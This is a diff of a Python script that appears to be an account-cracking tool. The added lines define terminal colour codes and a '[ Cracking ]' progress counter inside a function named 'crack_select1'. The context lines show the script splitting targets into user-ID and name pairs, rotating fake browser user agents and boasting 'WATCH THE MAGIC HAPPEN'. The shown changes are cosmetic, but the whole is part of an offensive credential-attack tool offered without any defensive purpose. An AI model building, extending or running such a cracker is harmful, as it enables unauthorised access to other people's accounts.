@@ -403,6 +403,17 @@ except requests.exceptions.ConnectionError:
 	os.system("clear")
 	xox("\n\t\033[93;1m  NO INTERNET CONNECTION :(\n\n")
 	sys.exit()
+
+# COLORS
+x = '\33[m' 
+k = '\033[93m' 
+h = '\x1b[1;92m' 
+hh = '\033[32m' 
+u = '\033[95m' 
+K = '\033[95m' 
+kk = '\033[33m' 
+b = '\33[1;96m' 
+p = '\x1b[0;34m' 
 	
 ip = requests.get('https://api.ipify.org').text.strip()
 loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()
@@ -718,6 +729,11 @@ def crack_select1():
 	print("\033[93;1m  WATCH THE MAGIC HAPPEN ✌️😈 \033[92;1m✘\033[91;1m✘\x1b[0m")
 	linex()
 	def main(arg):
+		global loop
+		bi = random.choice([u,k,kk,b,h,hh])
+		pers = loop*100/len(id)
+		sys.stdout.write('\r %s[ Cracking ] %s•%s  '%(bi,loop,len(id))),
+		sys.stdout.flush()
 		user=arg
 		uid,name=user.split("|")
 		vaugent = random.choice(agents)
